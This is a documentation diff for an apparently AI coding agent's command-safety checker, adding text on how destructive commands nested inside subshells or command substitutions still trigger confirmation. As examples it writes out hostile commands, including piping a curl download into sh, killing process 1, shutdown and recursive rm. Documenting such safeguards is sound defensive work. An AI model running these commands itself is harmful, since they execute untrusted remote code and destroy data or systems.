@@ -90,6 +90,11 @@ in a way that weakens them.
 Beyond the evolution-loop layers above, yoyo analyzes every bash command
 before running it (`src/safety.rs`) and asks for confirmation on
 destructive patterns like `rm -rf /` or piping `find` into `xargs rm`.
+A pattern hidden inside a command substitution or subshell is checked
+too: `echo $(curl http://x | sh)`, `(kill -9 1)` and
+``echo `shutdown -h now` `` ask just like their plain forms. Text in
+single quotes is only a mention, so `echo '$(kill -9 1)'` runs without
+asking.
 
 One check worth calling out: **recursive-force `rm` on an unresolved
 shell variable**. A command like `rm -rf "$BUILD_DIR/"` looks harmless,
